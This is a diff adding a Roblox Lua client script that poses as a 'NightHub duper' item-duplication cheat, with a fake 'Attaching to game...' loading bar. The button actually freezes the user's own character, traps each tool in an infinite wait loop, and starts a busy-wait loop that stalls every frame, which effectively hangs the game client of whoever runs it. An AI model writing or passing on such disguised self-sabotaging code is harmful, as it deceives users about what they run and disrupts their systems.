@@ -1,0 +1,120 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local camera = workspace.CurrentCamera
+
+-- ===== LOADING SCREEN =====
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "LoadingScreenGUI"
+loadingGui.Parent = player:WaitForChild("PlayerGui")
+
+local blackFrame = Instance.new("Frame")
+blackFrame.Size = UDim2.new(1,0,1,0)
+blackFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+blackFrame.Parent = loadingGui
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(0,300,0,50)
+label.Position = UDim2.new(0.5,-150,0.4,0)
+label.BackgroundTransparency = 1
+label.Text = "Attaching to game..."
+label.TextColor3 = Color3.fromRGB(255,255,255)
+label.TextScaled = true
+label.Font = Enum.Font.GothamBold
+label.Parent = blackFrame
+
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(0,300,0,25)
+barBG.Position = UDim2.new(0.5,-150,0.5,0)
+barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
+barBG.Parent = blackFrame
+
+local barCornerBG = Instance.new("UICorner")
+barCornerBG.CornerRadius = UDim.new(0,12)
+barCornerBG.Parent = barBG
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0,0,1,0)
+barFill.BackgroundColor3 = Color3.fromRGB(255,255,255)
+barFill.Parent = barBG
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(0,12)
+barCorner.Parent = barFill
+
+-- Animate loading bar for 8–10 seconds
+local totalTime = 12 -- seconds
+local steps = 100
+for i = 1, steps do
+    barFill.Size = UDim2.new(i/steps,0,1,0)
+    task.wait(totalTime/steps)
+end
+
+loadingGui:Destroy() -- remove loading screen
+
+-- ===== BUTTON TO ACTIVATE 
+local gui = Instance.new("ScreenGui")
+gui.Parent = player:WaitForChild("PlayerGui")
+
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0,250,0,60)
+button.Position = UDim2.new(0.5,-125,0.4,-30)
+button.Text = "NightHub duper😈"
+button.BackgroundColor3 = Color3.fromRGB(0,0,0)
+button.TextColor3 = Color3.fromRGB(255,255,255)
+button.BorderColor3 = Color3.fromRGB(255,255,255)
+button.BorderSizePixel = 2
+button.TextScaled = true
+button.Font = Enum.Font.GothamBold
+button.Parent = gui
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0,12)
+buttonCorner.Parent = button
+button.Active = true
+button.Draggable = true
+
+-- ===== Freeze
+local function maxFreeze()
+    -- Anchor character completely
+    for _, part in pairs(character:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.Anchored = true
+        end
+    end
+
+    -- Stop humanoid movement
+    local hum = character:FindFirstChildOfClass("Humanoid")
+    if hum then
+        hum.WalkSpeed = 0
+        hum.JumpPower = 0
+    end
+
+    -- Stop all animations
+    for _, anim in pairs(character:GetDescendants()) do
+        if anim:IsA("AnimationTrack") then
+            anim:AdjustSpeed(0)
+        end
+    end
+
+    -- Freeze tools
+    for _, tool in pairs(player.Backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            tool.Activated:Connect(function()
+                while true do task.wait() end -- infinite hold
+            end)
+        end
+    end
+
+    -- Overload RenderStepped
+    spawn(function()
+        while true do
+            local t0 = tick()
+            repeat until tick() - t0 > 1 -- hold each frame for 1 second
+            camera.CFrame = camera.CFrame * CFrame.Angles(0, math.rad(math.random(-2,2)), 0)
+        end
+    end)
+end
+
+button.MouseButton1Click:Connect(maxFreeze)
